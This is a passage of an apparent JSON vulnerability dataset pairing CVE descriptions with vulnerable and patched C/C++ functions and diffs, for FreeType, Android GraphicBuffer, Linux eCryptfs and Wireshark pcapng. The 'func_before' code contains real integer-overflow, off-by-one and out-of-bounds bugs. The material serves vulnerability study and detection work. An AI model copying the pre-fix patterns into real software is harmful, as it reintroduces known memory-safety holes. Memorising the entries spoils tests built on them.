                "    if (g_CharsetNames[charset] == NULL) {",
                "        return CIDSET_UNKNOWN;",
                "    }",
                "    return charset;"
            ],
            "added_lines": [
                "\tfor (int charset = 1; charset < NUMBER_OF_CIDSETS; charset++) {",
                "\t\tif (Ordering == CFX_ByteStringC(g_CharsetNames[charset]))",
                "\t\t\treturn charset;",
                "\t}",
                "\treturn CIDSET_UNKNOWN;"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-9666",
        "func_name": "freetype/freetype2/tt_sbit_decoder_init",
        "description": "The tt_sbit_decoder_init function in sfnt/ttsbit.c in FreeType before 2.5.4 proceeds with a count-to-size association without restricting the count value, which allows remote attackers to cause a denial of service (integer overflow and out-of-bounds read) or possibly have unspecified other impact via a crafted embedded bitmap.",
        "git_url": "http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=257c270bd25e15890190a28a1456e7623bba4439",
        "commit_title": "* src/sfnt/ttsbit.c (tt_sbit_decoder_init): Protect against addition",
        "commit_text": "and multiplication overflow. ",
        "func_before": "static FT_Error\n  tt_sbit_decoder_init( TT_SBitDecoder       decoder,\n                        TT_Face              face,\n                        FT_ULong             strike_index,\n                        TT_SBit_MetricsRec*  metrics )\n  {\n    FT_Error   error;\n    FT_Stream  stream = face->root.stream;\n    FT_ULong   ebdt_size;\n\n\n    error = face->goto_table( face, TTAG_CBDT, stream, &ebdt_size );\n    if ( error )\n      error = face->goto_table( face, TTAG_EBDT, stream, &ebdt_size );\n    if ( error )\n      error = face->goto_table( face, TTAG_bdat, stream, &ebdt_size );\n    if ( error )\n      goto Exit;\n\n    decoder->face    = face;\n    decoder->stream  = stream;\n    decoder->bitmap  = &face->root.glyph->bitmap;\n    decoder->metrics = metrics;\n\n    decoder->metrics_loaded   = 0;\n    decoder->bitmap_allocated = 0;\n\n    decoder->ebdt_start = FT_STREAM_POS();\n    decoder->ebdt_size  = ebdt_size;\n\n    decoder->eblc_base  = face->sbit_table;\n    decoder->eblc_limit = face->sbit_table + face->sbit_table_size;\n\n    /* now find the strike corresponding to the index */\n    {\n      FT_Byte*  p;\n\n\n      if ( 8 + 48 * strike_index + 3 * 4 + 34 + 1 > face->sbit_table_size )\n      {\n        error = FT_THROW( Invalid_File_Format );\n        goto Exit;\n      }\n\n      p = decoder->eblc_base + 8 + 48 * strike_index;\n\n      decoder->strike_index_array = FT_NEXT_ULONG( p );\n      p                          += 4;\n      decoder->strike_index_count = FT_NEXT_ULONG( p );\n      p                          += 34;\n      decoder->bit_depth          = *p;\n\n      if ( decoder->strike_index_array > face->sbit_table_size             ||\n           decoder->strike_index_array + 8 * decoder->strike_index_count >\n             face->sbit_table_size                                         )\n        error = FT_THROW( Invalid_File_Format );\n    }\n\n  Exit:\n    return error;\n  }",
        "func": "static FT_Error\n  tt_sbit_decoder_init( TT_SBitDecoder       decoder,\n                        TT_Face              face,\n                        FT_ULong             strike_index,\n                        TT_SBit_MetricsRec*  metrics )\n  {\n    FT_Error   error;\n    FT_Stream  stream = face->root.stream;\n    FT_ULong   ebdt_size;\n\n\n    error = face->goto_table( face, TTAG_CBDT, stream, &ebdt_size );\n    if ( error )\n      error = face->goto_table( face, TTAG_EBDT, stream, &ebdt_size );\n    if ( error )\n      error = face->goto_table( face, TTAG_bdat, stream, &ebdt_size );\n    if ( error )\n      goto Exit;\n\n    decoder->face    = face;\n    decoder->stream  = stream;\n    decoder->bitmap  = &face->root.glyph->bitmap;\n    decoder->metrics = metrics;\n\n    decoder->metrics_loaded   = 0;\n    decoder->bitmap_allocated = 0;\n\n    decoder->ebdt_start = FT_STREAM_POS();\n    decoder->ebdt_size  = ebdt_size;\n\n    decoder->eblc_base  = face->sbit_table;\n    decoder->eblc_limit = face->sbit_table + face->sbit_table_size;\n\n    /* now find the strike corresponding to the index */\n    {\n      FT_Byte*  p;\n\n\n      if ( 8 + 48 * strike_index + 3 * 4 + 34 + 1 > face->sbit_table_size )\n      {\n        error = FT_THROW( Invalid_File_Format );\n        goto Exit;\n      }\n\n      p = decoder->eblc_base + 8 + 48 * strike_index;\n\n      decoder->strike_index_array = FT_NEXT_ULONG( p );\n      p                          += 4;\n      decoder->strike_index_count = FT_NEXT_ULONG( p );\n      p                          += 34;\n      decoder->bit_depth          = *p;\n\n      /* decoder->strike_index_array +                               */\n      /*   8 * decoder->strike_index_count > face->sbit_table_size ? */\n      if ( decoder->strike_index_array > face->sbit_table_size           ||\n           decoder->strike_index_count >\n             ( face->sbit_table_size - decoder->strike_index_array ) / 8 )\n        error = FT_THROW( Invalid_File_Format );\n    }\n\n  Exit:\n    return error;\n  }",
        "diff_func": "--- func_before\n+++ func_after\n@@ -50,9 +50,11 @@\n       p                          += 34;\n       decoder->bit_depth          = *p;\n \n-      if ( decoder->strike_index_array > face->sbit_table_size             ||\n-           decoder->strike_index_array + 8 * decoder->strike_index_count >\n-             face->sbit_table_size                                         )\n+      /* decoder->strike_index_array +                               */\n+      /*   8 * decoder->strike_index_count > face->sbit_table_size ? */\n+      if ( decoder->strike_index_array > face->sbit_table_size           ||\n+           decoder->strike_index_count >\n+             ( face->sbit_table_size - decoder->strike_index_array ) / 8 )\n         error = FT_THROW( Invalid_File_Format );\n     }\n ",
        "diff_line_info": {
            "deleted_lines": [
                "      if ( decoder->strike_index_array > face->sbit_table_size             ||",
                "           decoder->strike_index_array + 8 * decoder->strike_index_count >",
                "             face->sbit_table_size                                         )"
            ],
            "added_lines": [
                "      /* decoder->strike_index_array +                               */",
                "      /*   8 * decoder->strike_index_count > face->sbit_table_size ? */",
                "      if ( decoder->strike_index_array > face->sbit_table_size           ||",
                "           decoder->strike_index_count >",
                "             ( face->sbit_table_size - decoder->strike_index_array ) / 8 )"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-9670",
        "func_name": "freetype/freetype2/pcf_get_encodings",
        "description": "Multiple integer signedness errors in the pcf_get_encodings function in pcf/pcfread.c in FreeType before 2.5.4 allow remote attackers to cause a denial of service (integer overflow, NULL pointer dereference, and application crash) via a crafted PCF file that specifies negative values for the first column and first row.",
        "git_url": "http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ef1eba75187adfac750f326b563fe543dd5ff4e6",
        "commit_title": "* src/pcf/pcfread (pcf_get_encodings): Add sanity checks for row and",
        "commit_text": "column values. ",
        "func_before": "static FT_Error\n  pcf_get_encodings( FT_Stream  stream,\n                     PCF_Face   face )\n  {\n    FT_Error      error;\n    FT_Memory     memory = FT_FACE( face )->memory;\n    FT_ULong      format, size;\n    int           firstCol, lastCol;\n    int           firstRow, lastRow;\n    int           nencoding, encodingOffset;\n    int           i, j, k;\n    PCF_Encoding  encoding = NULL;\n\n\n    error = pcf_seek_to_table_type( stream,\n                                    face->toc.tables,\n                                    face->toc.count,\n                                    PCF_BDF_ENCODINGS,\n                                    &format,\n                                    &size );\n    if ( error )\n      return error;\n\n    error = FT_Stream_EnterFrame( stream, 14 );\n    if ( error )\n      return error;\n\n    format = FT_GET_ULONG_LE();\n\n    if ( PCF_BYTE_ORDER( format ) == MSBFirst )\n    {\n      firstCol          = FT_GET_SHORT();\n      lastCol           = FT_GET_SHORT();\n      firstRow          = FT_GET_SHORT();\n      lastRow           = FT_GET_SHORT();\n      face->defaultChar = FT_GET_SHORT();\n    }\n    else\n    {\n      firstCol          = FT_GET_SHORT_LE();\n      lastCol           = FT_GET_SHORT_LE();\n      firstRow          = FT_GET_SHORT_LE();\n      lastRow           = FT_GET_SHORT_LE();\n      face->defaultChar = FT_GET_SHORT_LE();\n    }\n\n    FT_Stream_ExitFrame( stream );\n\n    if ( !PCF_FORMAT_MATCH( format, PCF_DEFAULT_FORMAT ) )\n      return FT_THROW( Invalid_File_Format );\n\n    FT_TRACE4(( \"pdf_get_encodings:\\n\" ));\n\n    FT_TRACE4(( \"  firstCol %d, lastCol %d, firstRow %d, lastRow %d\\n\",\n                firstCol, lastCol, firstRow, lastRow ));\n\n    nencoding = ( lastCol - firstCol + 1 ) * ( lastRow - firstRow + 1 );\n\n    if ( FT_NEW_ARRAY( encoding, nencoding ) )\n      return FT_THROW( Out_Of_Memory );\n\n    error = FT_Stream_EnterFrame( stream, 2 * nencoding );\n    if ( error )\n      goto Bail;\n\n    k = 0;\n    for ( i = firstRow; i <= lastRow; i++ )\n    {\n      for ( j = firstCol; j <= lastCol; j++ )\n      {\n        if ( PCF_BYTE_ORDER( format ) == MSBFirst )\n          encodingOffset = FT_GET_SHORT();\n        else\n          encodingOffset = FT_GET_SHORT_LE();\n\n        if ( encodingOffset != -1 )\n        {\n          encoding[k].enc   = i * 256 + j;\n          encoding[k].glyph = (FT_Short)encodingOffset;\n\n          FT_TRACE5(( \"  code %d (0x%04X): idx %d\\n\",\n                      encoding[k].enc, encoding[k].enc, encoding[k].glyph ));\n\n          k++;\n        }\n      }\n    }\n    FT_Stream_ExitFrame( stream );\n\n    if ( FT_RENEW_ARRAY( encoding, nencoding, k ) )\n      goto Bail;\n\n    face->nencodings = k;\n    face->encodings  = encoding;\n\n    return error;\n\n  Bail:\n    FT_FREE( encoding );\n    return error;\n  }",
        "func": "static FT_Error\n  pcf_get_encodings( FT_Stream  stream,\n                     PCF_Face   face )\n  {\n    FT_Error      error;\n    FT_Memory     memory = FT_FACE( face )->memory;\n    FT_ULong      format, size;\n    int           firstCol, lastCol;\n    int           firstRow, lastRow;\n    int           nencoding, encodingOffset;\n    int           i, j, k;\n    PCF_Encoding  encoding = NULL;\n\n\n    error = pcf_seek_to_table_type( stream,\n                                    face->toc.tables,\n                                    face->toc.count,\n                                    PCF_BDF_ENCODINGS,\n                                    &format,\n                                    &size );\n    if ( error )\n      return error;\n\n    error = FT_Stream_EnterFrame( stream, 14 );\n    if ( error )\n      return error;\n\n    format = FT_GET_ULONG_LE();\n\n    if ( PCF_BYTE_ORDER( format ) == MSBFirst )\n    {\n      firstCol          = FT_GET_SHORT();\n      lastCol           = FT_GET_SHORT();\n      firstRow          = FT_GET_SHORT();\n      lastRow           = FT_GET_SHORT();\n      face->defaultChar = FT_GET_SHORT();\n    }\n    else\n    {\n      firstCol          = FT_GET_SHORT_LE();\n      lastCol           = FT_GET_SHORT_LE();\n      firstRow          = FT_GET_SHORT_LE();\n      lastRow           = FT_GET_SHORT_LE();\n      face->defaultChar = FT_GET_SHORT_LE();\n    }\n\n    FT_Stream_ExitFrame( stream );\n\n    if ( !PCF_FORMAT_MATCH( format, PCF_DEFAULT_FORMAT ) )\n      return FT_THROW( Invalid_File_Format );\n\n    /* sanity checks */\n    if ( firstCol < 0       ||\n         firstCol > lastCol ||\n         lastCol  > 0xFF    ||\n         firstRow < 0       ||\n         firstRow > lastRow ||\n         lastRow  > 0xFF    )\n      return FT_THROW( Invalid_Table );\n\n    FT_TRACE4(( \"pdf_get_encodings:\\n\" ));\n\n    FT_TRACE4(( \"  firstCol %d, lastCol %d, firstRow %d, lastRow %d\\n\",\n                firstCol, lastCol, firstRow, lastRow ));\n\n    nencoding = ( lastCol - firstCol + 1 ) * ( lastRow - firstRow + 1 );\n\n    if ( FT_NEW_ARRAY( encoding, nencoding ) )\n      return FT_THROW( Out_Of_Memory );\n\n    error = FT_Stream_EnterFrame( stream, 2 * nencoding );\n    if ( error )\n      goto Bail;\n\n    k = 0;\n    for ( i = firstRow; i <= lastRow; i++ )\n    {\n      for ( j = firstCol; j <= lastCol; j++ )\n      {\n        if ( PCF_BYTE_ORDER( format ) == MSBFirst )\n          encodingOffset = FT_GET_SHORT();\n        else\n          encodingOffset = FT_GET_SHORT_LE();\n\n        if ( encodingOffset != -1 )\n        {\n          encoding[k].enc   = i * 256 + j;\n          encoding[k].glyph = (FT_Short)encodingOffset;\n\n          FT_TRACE5(( \"  code %d (0x%04X): idx %d\\n\",\n                      encoding[k].enc, encoding[k].enc, encoding[k].glyph ));\n\n          k++;\n        }\n      }\n    }\n    FT_Stream_ExitFrame( stream );\n\n    if ( FT_RENEW_ARRAY( encoding, nencoding, k ) )\n      goto Bail;\n\n    face->nencodings = k;\n    face->encodings  = encoding;\n\n    return error;\n\n  Bail:\n    FT_FREE( encoding );\n    return error;\n  }",
        "diff_func": "--- func_before\n+++ func_after\n@@ -49,6 +49,15 @@\n     if ( !PCF_FORMAT_MATCH( format, PCF_DEFAULT_FORMAT ) )\n       return FT_THROW( Invalid_File_Format );\n \n+    /* sanity checks */\n+    if ( firstCol < 0       ||\n+         firstCol > lastCol ||\n+         lastCol  > 0xFF    ||\n+         firstRow < 0       ||\n+         firstRow > lastRow ||\n+         lastRow  > 0xFF    )\n+      return FT_THROW( Invalid_Table );\n+\n     FT_TRACE4(( \"pdf_get_encodings:\\n\" ));\n \n     FT_TRACE4(( \"  firstCol %d, lastCol %d, firstRow %d, lastRow %d\\n\",",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "    /* sanity checks */",
                "    if ( firstCol < 0       ||",
                "         firstCol > lastCol ||",
                "         lastCol  > 0xFF    ||",
                "         firstRow < 0       ||",
                "         firstRow > lastRow ||",
                "         lastRow  > 0xFF    )",
                "      return FT_THROW( Invalid_Table );",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-1474",
        "func_name": "android/GraphicBuffer::unflatten",
        "description": "Multiple integer overflows in the GraphicBuffer::unflatten function in platform/frameworks/native/libs/ui/GraphicBuffer.cpp in Android through 5.0 allow attackers to gain privileges or cause a denial of service (memory corruption) via vectors that trigger a large number of (1) file descriptors or (2) integer values.",
        "git_url": "https://android.googlesource.com/platform/frameworks/native/+/38803268570f90e97452cd9a30ac831661829091",
        "commit_title": "Fix for corruption when numFds or numInts is too large.",
        "commit_text": " Bug: 18076253 (cherry picked from commit dfd06b89a4b77fc75eb85a3c1c700da3621c0118) ",
        "func_before": "status_t GraphicBuffer::unflatten(\n        void const*& buffer, size_t& size, int const*& fds, size_t& count) {\n    if (size < 8*sizeof(int)) return NO_MEMORY;\n\n    int const* buf = static_cast<int const*>(buffer);\n    if (buf[0] != 'GBFR') return BAD_TYPE;\n\n    const size_t numFds  = buf[8];\n    const size_t numInts = buf[9];\n\n    const size_t sizeNeeded = (10 + numInts) * sizeof(int);\n    if (size < sizeNeeded) return NO_MEMORY;\n\n    size_t fdCountNeeded = 0;\n    if (count < fdCountNeeded) return NO_MEMORY;\n\n    if (handle) {\n        // free previous handle if any\n        free_handle();\n    }\n\n    if (numFds || numInts) {\n        width  = buf[1];\n        height = buf[2];\n        stride = buf[3];\n        format = buf[4];\n        usage  = buf[5];\n        native_handle* h = native_handle_create(numFds, numInts);\n        memcpy(h->data,          fds,     numFds*sizeof(int));\n        memcpy(h->data + numFds, &buf[10], numInts*sizeof(int));\n        handle = h;\n    } else {\n        width = height = stride = format = usage = 0;\n        handle = NULL;\n    }\n\n    mId = static_cast<uint64_t>(buf[6]) << 32;\n    mId |= static_cast<uint32_t>(buf[7]);\n\n    mOwner = ownHandle;\n\n    if (handle != 0) {\n        status_t err = mBufferMapper.registerBuffer(handle);\n        if (err != NO_ERROR) {\n            width = height = stride = format = usage = 0;\n            handle = NULL;\n            ALOGE(\"unflatten: registerBuffer failed: %s (%d)\",\n                    strerror(-err), err);\n            return err;\n        }\n    }\n\n    buffer = reinterpret_cast<void const*>(static_cast<int const*>(buffer) + sizeNeeded);\n    size -= sizeNeeded;\n    fds += numFds;\n    count -= numFds;\n\n    return NO_ERROR;\n}",
        "func": "status_t GraphicBuffer::unflatten(\n        void const*& buffer, size_t& size, int const*& fds, size_t& count) {\n    if (size < 8*sizeof(int)) return NO_MEMORY;\n\n    int const* buf = static_cast<int const*>(buffer);\n    if (buf[0] != 'GBFR') return BAD_TYPE;\n\n    const size_t numFds  = buf[8];\n    const size_t numInts = buf[9];\n\n    const size_t maxNumber = UINT_MAX / sizeof(int);\n    if (numFds >= maxNumber || numInts >= (maxNumber - 10)) {\n        width = height = stride = format = usage = 0;\n        handle = NULL;\n        ALOGE(\"unflatten: numFds or numInts is too large: %d, %d\",\n                numFds, numInts);\n        return BAD_VALUE;\n    }\n\n    const size_t sizeNeeded = (10 + numInts) * sizeof(int);\n    if (size < sizeNeeded) return NO_MEMORY;\n\n    size_t fdCountNeeded = numFds;\n    if (count < fdCountNeeded) return NO_MEMORY;\n\n    if (handle) {\n        // free previous handle if any\n        free_handle();\n    }\n\n    if (numFds || numInts) {\n        width  = buf[1];\n        height = buf[2];\n        stride = buf[3];\n        format = buf[4];\n        usage  = buf[5];\n        native_handle* h = native_handle_create(numFds, numInts);\n        if (!h) {\n            width = height = stride = format = usage = 0;\n            handle = NULL;\n            ALOGE(\"unflatten: native_handle_create failed\");\n            return NO_MEMORY;\n        }\n        memcpy(h->data,          fds,     numFds*sizeof(int));\n        memcpy(h->data + numFds, &buf[10], numInts*sizeof(int));\n        handle = h;\n    } else {\n        width = height = stride = format = usage = 0;\n        handle = NULL;\n    }\n\n    mId = static_cast<uint64_t>(buf[6]) << 32;\n    mId |= static_cast<uint32_t>(buf[7]);\n\n    mOwner = ownHandle;\n\n    if (handle != 0) {\n        status_t err = mBufferMapper.registerBuffer(handle);\n        if (err != NO_ERROR) {\n            width = height = stride = format = usage = 0;\n            handle = NULL;\n            ALOGE(\"unflatten: registerBuffer failed: %s (%d)\",\n                    strerror(-err), err);\n            return err;\n        }\n    }\n\n    buffer = reinterpret_cast<void const*>(static_cast<int const*>(buffer) + sizeNeeded);\n    size -= sizeNeeded;\n    fds += numFds;\n    count -= numFds;\n\n    return NO_ERROR;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,10 +8,19 @@\n     const size_t numFds  = buf[8];\n     const size_t numInts = buf[9];\n \n+    const size_t maxNumber = UINT_MAX / sizeof(int);\n+    if (numFds >= maxNumber || numInts >= (maxNumber - 10)) {\n+        width = height = stride = format = usage = 0;\n+        handle = NULL;\n+        ALOGE(\"unflatten: numFds or numInts is too large: %d, %d\",\n+                numFds, numInts);\n+        return BAD_VALUE;\n+    }\n+\n     const size_t sizeNeeded = (10 + numInts) * sizeof(int);\n     if (size < sizeNeeded) return NO_MEMORY;\n \n-    size_t fdCountNeeded = 0;\n+    size_t fdCountNeeded = numFds;\n     if (count < fdCountNeeded) return NO_MEMORY;\n \n     if (handle) {\n@@ -26,6 +35,12 @@\n         format = buf[4];\n         usage  = buf[5];\n         native_handle* h = native_handle_create(numFds, numInts);\n+        if (!h) {\n+            width = height = stride = format = usage = 0;\n+            handle = NULL;\n+            ALOGE(\"unflatten: native_handle_create failed\");\n+            return NO_MEMORY;\n+        }\n         memcpy(h->data,          fds,     numFds*sizeof(int));\n         memcpy(h->data + numFds, &buf[10], numInts*sizeof(int));\n         handle = h;",
        "diff_line_info": {
            "deleted_lines": [
                "    size_t fdCountNeeded = 0;"
            ],
            "added_lines": [
                "    const size_t maxNumber = UINT_MAX / sizeof(int);",
                "    if (numFds >= maxNumber || numInts >= (maxNumber - 10)) {",
                "        width = height = stride = format = usage = 0;",
                "        handle = NULL;",
                "        ALOGE(\"unflatten: numFds or numInts is too large: %d, %d\",",
                "                numFds, numInts);",
                "        return BAD_VALUE;",
                "    }",
                "",
                "    size_t fdCountNeeded = numFds;",
                "        if (!h) {",
                "            width = height = stride = format = usage = 0;",
                "            handle = NULL;",
                "            ALOGE(\"unflatten: native_handle_create failed\");",
                "            return NO_MEMORY;",
                "        }"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-9683",
        "func_name": "torvalds/linux/ecryptfs_decode_from_filename",
        "description": "Off-by-one error in the ecryptfs_decode_from_filename function in fs/ecryptfs/crypto.c in the eCryptfs subsystem in the Linux kernel before 3.18.2 allows local users to cause a denial of service (buffer overflow and system crash) or possibly gain privileges via a crafted filename.",
        "git_url": "https://github.com/torvalds/linux/commit/942080643bce061c3dd9d5718d3b745dcb39a8bc",
        "commit_title": "eCryptfs: Remove buggy and unnecessary write in file name decode routine",
        "commit_text": " Dmitry Chernenkov used KASAN to discover that eCryptfs writes past the end of the allocated buffer during encrypted filename decoding. This fix corrects the issue by getting rid of the unnecessary 0 write when the current bit offset is 2.  Suggested-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org # v2.6.29+: 51ca58d eCryptfs: Filename Encryption: Encoding and encryption functions",
        "func_before": "static void\necryptfs_decode_from_filename(unsigned char *dst, size_t *dst_size,\n\t\t\t      const unsigned char *src, size_t src_size)\n{\n\tu8 current_bit_offset = 0;\n\tsize_t src_byte_offset = 0;\n\tsize_t dst_byte_offset = 0;\n\n\tif (dst == NULL) {\n\t\t(*dst_size) = ecryptfs_max_decoded_size(src_size);\n\t\tgoto out;\n\t}\n\twhile (src_byte_offset < src_size) {\n\t\tunsigned char src_byte =\n\t\t\t\tfilename_rev_map[(int)src[src_byte_offset]];\n\n\t\tswitch (current_bit_offset) {\n\t\tcase 0:\n\t\t\tdst[dst_byte_offset] = (src_byte << 2);\n\t\t\tcurrent_bit_offset = 6;\n\t\t\tbreak;\n\t\tcase 6:\n\t\t\tdst[dst_byte_offset++] |= (src_byte >> 4);\n\t\t\tdst[dst_byte_offset] = ((src_byte & 0xF)\n\t\t\t\t\t\t << 4);\n\t\t\tcurrent_bit_offset = 4;\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tdst[dst_byte_offset++] |= (src_byte >> 2);\n\t\t\tdst[dst_byte_offset] = (src_byte << 6);\n\t\t\tcurrent_bit_offset = 2;\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tdst[dst_byte_offset++] |= (src_byte);\n\t\t\tdst[dst_byte_offset] = 0;\n\t\t\tcurrent_bit_offset = 0;\n\t\t\tbreak;\n\t\t}\n\t\tsrc_byte_offset++;\n\t}\n\t(*dst_size) = dst_byte_offset;\nout:\n\treturn;\n}",
        "func": "static void\necryptfs_decode_from_filename(unsigned char *dst, size_t *dst_size,\n\t\t\t      const unsigned char *src, size_t src_size)\n{\n\tu8 current_bit_offset = 0;\n\tsize_t src_byte_offset = 0;\n\tsize_t dst_byte_offset = 0;\n\n\tif (dst == NULL) {\n\t\t(*dst_size) = ecryptfs_max_decoded_size(src_size);\n\t\tgoto out;\n\t}\n\twhile (src_byte_offset < src_size) {\n\t\tunsigned char src_byte =\n\t\t\t\tfilename_rev_map[(int)src[src_byte_offset]];\n\n\t\tswitch (current_bit_offset) {\n\t\tcase 0:\n\t\t\tdst[dst_byte_offset] = (src_byte << 2);\n\t\t\tcurrent_bit_offset = 6;\n\t\t\tbreak;\n\t\tcase 6:\n\t\t\tdst[dst_byte_offset++] |= (src_byte >> 4);\n\t\t\tdst[dst_byte_offset] = ((src_byte & 0xF)\n\t\t\t\t\t\t << 4);\n\t\t\tcurrent_bit_offset = 4;\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tdst[dst_byte_offset++] |= (src_byte >> 2);\n\t\t\tdst[dst_byte_offset] = (src_byte << 6);\n\t\t\tcurrent_bit_offset = 2;\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tdst[dst_byte_offset++] |= (src_byte);\n\t\t\tcurrent_bit_offset = 0;\n\t\t\tbreak;\n\t\t}\n\t\tsrc_byte_offset++;\n\t}\n\t(*dst_size) = dst_byte_offset;\nout:\n\treturn;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -32,7 +32,6 @@\n \t\t\tbreak;\n \t\tcase 2:\n \t\t\tdst[dst_byte_offset++] |= (src_byte);\n-\t\t\tdst[dst_byte_offset] = 0;\n \t\t\tcurrent_bit_offset = 0;\n \t\t\tbreak;\n \t\t}",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\tdst[dst_byte_offset] = 0;"
            ],
            "added_lines": []
        }
    },
    {
        "cve_id": "CVE-2015-2189",
        "func_name": "wireshark/pcapng_read",
        "description": "Off-by-one error in the pcapng_read function in wiretap/pcapng.c in the pcapng file parser in Wireshark 1.10.x before 1.10.13 and 1.12.x before 1.12.4 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via an invalid Interface Statistics Block (ISB) interface ID in a crafted packet.",
        "git_url": "https://github.com/wireshark/wireshark/commit/a835c85e3d662343d7283f1dcdacb8a11d1d0727",
        "commit_title": "Pcapng: Don't fetch past the end of a GArray.",
        "commit_text": " Due to an off-by-one error an invalid ISB interface ID could make us fetch past the end of a GArray. Found using American Fuzzy Lop.  Bug: 10895",
        "func_before": "static gboolean\npcapng_read(wtap *wth, int *err, gchar **err_info, gint64 *data_offset)\n{\n    pcapng_t *pcapng = (pcapng_t *)wth->priv;\n    wtapng_block_t wblock;\n    wtapng_if_descr_t *wtapng_if_descr;\n    wtapng_if_stats_t if_stats;\n\n    wblock.frame_buffer  = wth->frame_buffer;\n    wblock.packet_header = &wth->phdr;\n\n    pcapng->add_new_ipv4 = wth->add_new_ipv4;\n    pcapng->add_new_ipv6 = wth->add_new_ipv6;\n\n    /* read next block */\n    while (1) {\n        *data_offset = file_tell(wth->fh);\n        pcapng_debug1(\"pcapng_read: data_offset is %\" G_GINT64_MODIFIER \"d\", *data_offset);\n        if (pcapng_read_block(wth, wth->fh, pcapng, &wblock, err, err_info) != PCAPNG_BLOCK_OK) {\n            pcapng_debug1(\"pcapng_read: data_offset is finally %\" G_GINT64_MODIFIER \"d\", *data_offset);\n            pcapng_debug0(\"pcapng_read: couldn't read packet block\");\n            return FALSE;\n        }\n\n        switch (wblock.type) {\n\n            case(BLOCK_TYPE_SHB):\n                /* We don't currently support multi-section files. */\n                wth->phdr.pkt_encap = WTAP_ENCAP_UNKNOWN;\n                wth->phdr.pkt_tsprec = WTAP_TSPREC_UNKNOWN;\n                *err = WTAP_ERR_UNSUPPORTED;\n                *err_info = g_strdup_printf(\"pcapng: multi-section files not currently supported\");\n                return FALSE;\n\n            case(BLOCK_TYPE_PB):\n            case(BLOCK_TYPE_SPB):\n            case(BLOCK_TYPE_EPB):\n                /* packet block - we've found a packet */\n                goto got_packet;\n\n            case(BLOCK_TYPE_IDB):\n                /* A new interface */\n                pcapng_debug0(\"pcapng_read: block type BLOCK_TYPE_IDB\");\n                pcapng_process_idb(wth, pcapng, &wblock);\n                break;\n\n            case(BLOCK_TYPE_NRB):\n                /* More name resolution entries */\n                pcapng_debug0(\"pcapng_read: block type BLOCK_TYPE_NRB\");\n                break;\n\n            case(BLOCK_TYPE_ISB):\n                /* Another interface statistics report */\n                pcapng_debug0(\"pcapng_read: block type BLOCK_TYPE_ISB\");\n                if (wth->interface_data->len < wblock.data.if_stats.interface_id) {\n                    pcapng_debug1(\"pcapng_read: BLOCK_TYPE_ISB wblock.if_stats.interface_id %u > number_of_interfaces\", wblock.data.if_stats.interface_id);\n                } else {\n                    /* Get the interface description */\n                    wtapng_if_descr = &g_array_index(wth->interface_data, wtapng_if_descr_t, wblock.data.if_stats.interface_id);\n                    if (wtapng_if_descr->num_stat_entries == 0) {\n                        /* First ISB found, no previous entry */\n                        pcapng_debug0(\"pcapng_read: block type BLOCK_TYPE_ISB. First ISB found, no previous entry\");\n                        wtapng_if_descr->interface_statistics = g_array_new(FALSE, FALSE, sizeof(wtapng_if_stats_t));\n                    }\n\n                    if_stats.interface_id       = wblock.data.if_stats.interface_id;\n                    if_stats.ts_high            = wblock.data.if_stats.ts_high;\n                    if_stats.ts_low             = wblock.data.if_stats.ts_low;\n                    /* options */\n                    if_stats.opt_comment        = wblock.data.if_stats.opt_comment;     /* NULL if not available */\n                    if_stats.isb_starttime      = wblock.data.if_stats.isb_starttime;\n                    if_stats.isb_endtime        = wblock.data.if_stats.isb_endtime;\n                    if_stats.isb_ifrecv         = wblock.data.if_stats.isb_ifrecv;\n                    if_stats.isb_ifdrop         = wblock.data.if_stats.isb_ifdrop;\n                    if_stats.isb_filteraccept   = wblock.data.if_stats.isb_filteraccept;\n                    if_stats.isb_osdrop         = wblock.data.if_stats.isb_osdrop;\n                    if_stats.isb_usrdeliv       = wblock.data.if_stats.isb_usrdeliv;\n\n                    g_array_append_val(wtapng_if_descr->interface_statistics, if_stats);\n                    wtapng_if_descr->num_stat_entries++;\n                }\n                break;\n\n            default:\n                /* XXX - improve handling of \"unknown\" blocks */\n                pcapng_debug1(\"pcapng_read: Unknown block type 0x%08x\", wblock.type);\n                break;\n        }\n    }\n\ngot_packet:\n\n    /*pcapng_debug2(\"Read length: %u Packet length: %u\", bytes_read, wth->phdr.caplen);*/\n    pcapng_debug1(\"pcapng_read: data_offset is finally %\" G_GINT64_MODIFIER \"d\", *data_offset + bytes_read);\n\n    return TRUE;\n}",
        "func": "static gboolean\npcapng_read(wtap *wth, int *err, gchar **err_info, gint64 *data_offset)\n{\n    pcapng_t *pcapng = (pcapng_t *)wth->priv;\n    wtapng_block_t wblock;\n    wtapng_if_descr_t *wtapng_if_descr;\n    wtapng_if_stats_t if_stats;\n\n    wblock.frame_buffer  = wth->frame_buffer;\n    wblock.packet_header = &wth->phdr;\n\n    pcapng->add_new_ipv4 = wth->add_new_ipv4;\n    pcapng->add_new_ipv6 = wth->add_new_ipv6;\n\n    /* read next block */\n    while (1) {\n        *data_offset = file_tell(wth->fh);\n        pcapng_debug1(\"pcapng_read: data_offset is %\" G_GINT64_MODIFIER \"d\", *data_offset);\n        if (pcapng_read_block(wth, wth->fh, pcapng, &wblock, err, err_info) != PCAPNG_BLOCK_OK) {\n            pcapng_debug1(\"pcapng_read: data_offset is finally %\" G_GINT64_MODIFIER \"d\", *data_offset);\n            pcapng_debug0(\"pcapng_read: couldn't read packet block\");\n            return FALSE;\n        }\n\n        switch (wblock.type) {\n\n            case(BLOCK_TYPE_SHB):\n                /* We don't currently support multi-section files. */\n                wth->phdr.pkt_encap = WTAP_ENCAP_UNKNOWN;\n                wth->phdr.pkt_tsprec = WTAP_TSPREC_UNKNOWN;\n                *err = WTAP_ERR_UNSUPPORTED;\n                *err_info = g_strdup_printf(\"pcapng: multi-section files not currently supported\");\n                return 